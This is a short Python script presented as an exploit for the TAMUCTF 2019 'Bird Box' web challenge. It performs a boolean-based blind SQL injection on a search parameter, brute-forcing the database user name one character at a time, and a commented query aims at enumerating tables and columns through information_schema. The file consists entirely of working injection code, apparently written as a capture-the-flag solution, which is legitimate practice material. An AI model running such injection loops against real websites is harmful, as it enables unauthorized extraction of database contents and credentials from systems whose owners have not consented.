#!/usr/bin/env python
# TAMUCTF 2019 Web2 Bird Box Challenge exploit

import ctfpwn
import urllib

# SELECT table_name FROM information_schema.tables WHERE table_schema="sqlidb"


base_url = "http://web2.tamuctf.com/Search.php?Search=Eggs' and "
resp = ctfpwn.http_get('http://web2.tamuctf.com/Search.php?Search=Eggs')
payload = ''

# """substring("SELECT column FROM information_schema.columns WHERE table_schema=database())",1,{})="{}"--%20-"""
while 'Eggs' in resp:
    for c in ctfpwn.get_character_set(lc=True, uc=True, nb=True, sc=True):
        current_payload = payload + c
        url = base_url + \
            "substring(user(),1,{})='{}'--%20-".format(len(current_payload),
                                                       current_payload)
        resp = ctfpwn.http_get(url)
        if 'Eggs' in resp:
            payload = payload + c
            break
    print payload
